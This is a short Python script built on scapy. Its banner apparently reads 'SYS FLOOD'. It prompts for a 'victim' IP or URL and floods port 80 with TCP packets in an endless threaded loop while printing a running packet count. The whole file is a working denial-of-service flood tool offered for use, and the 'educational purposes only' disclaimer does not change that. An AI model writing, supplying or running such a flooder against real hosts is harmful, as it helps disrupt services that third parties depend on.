#!/usr/bin/env python3

from scapy.all import *
import threading
import time


total_pacotes = 0


def print_banner():
    print("\033[92m")  
    print("""

  _____________.___. _________     __________.____    ________  ________  ________   
 /   _____\__  |   |/   _____/     \_   _____|    |   \_____  \ \_____  \ \______ \  
 \_____  \ /   |   |\_____  \       |    __) |    |    /   |   \ /   |   \ |    |  \ 
 /        |\____   |/        \      |     \  |    |___/    |    /    |    \|    `   |
/_______  // ______/_______  /      \___  /  |_______ \_______  \_______  /_______  /
        \/ \/              \/           \/           \/       \/        \/        \/


""")


def print_instrucoes():
    print("\033[0m")  # Volta à cor padrão
    print(
    'Instructions: After running the software, it will prompt for the victim\'s IP and will send numerous packets without any time interval.\n'
    '---------------------------------------------------------------------------------------------------------------------------------------\n'
    'This script is provided for educational purposes only.\n'
    'Do not use this script to conduct attacks against systems or networks without prior permission.\n'
    'I am not responsible for any misuse or consequences resulting from the use of this script.\n'
    '----------------------------------------------------------------------------------------------------------------------------------------\n'
    ''
    'Tool created for information security study purposes\n'
    '                                                                                                                   Created by Gian Viana'
)


if __name__ == "__main__":
    print_banner()
    print_instrucoes()


def obter_ip_vitima():
    ip_vitima = input("Digite o IP ou URL da vítima: ")
    return ip_vitima


def enviar_pacotes(ip_vitima):
    global total_pacotes

    while True:

        pacote = IP(dst=ip_vitima) / TCP(dport=80)

        send(pacote, verbose=0)

        total_pacotes += 1


def contar_pacotes_enviados():
    global total_pacotes

    while True:

        print("\rTotal de pacotes enviados:", total_pacotes, end="", flush=True)

        time.sleep(1)


def flood(ip_vitima):

    threading.Thread(target=enviar_pacotes, args=(ip_vitima,)).start()
    threading.Thread(target=contar_pacotes_enviados).start()


if __name__ == "__main__":
    print_banner()
    ip_vitima = obter_ip_vitima()
    flood(ip_vitima)
